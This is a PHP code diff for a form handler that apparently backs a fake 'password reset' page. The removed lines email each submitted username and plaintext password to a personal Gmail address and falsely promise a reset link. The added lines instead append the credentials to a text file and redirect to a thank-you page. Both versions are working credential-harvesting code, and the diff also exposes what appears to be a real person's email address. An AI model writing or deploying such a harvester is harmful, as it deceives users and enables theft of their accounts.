@@ -1,22 +1,19 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    // Get form data
     $username = $_POST["username"];
     $password = $_POST["password"];
 
-    // Define your email information
-    $to = "sigurd.aroen@gmail.com"; // Replace with the recipient's email address
-    $subject = "Password Reset Request";
-    $message = "Username: $username\nPassword: $password";
+    // Define a file to save the data (e.g., form_data.txt)
+    $file = "form_data.txt";
 
-    // Send the email
-    if (mail($to, $subject, $message, $headers)) {
-        // Email sent successfully
-        echo "Email sent successfully. You will receive a password reset link shortly.";
-    } else {
-        // Email sending failed
-        echo "Email sending failed. Please try again later.";
-    }
+    // Format the data to save
+    $data = "Username: $username\nPassword: $password\n\n";
+
+    // Append the data to the file
+    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
+
+    // Redirect the user to a thank you page
+    header("Location: thank_you.html");
 } else {
     // Redirect to an error page if the request method is not POST
     header("Location: error.html");
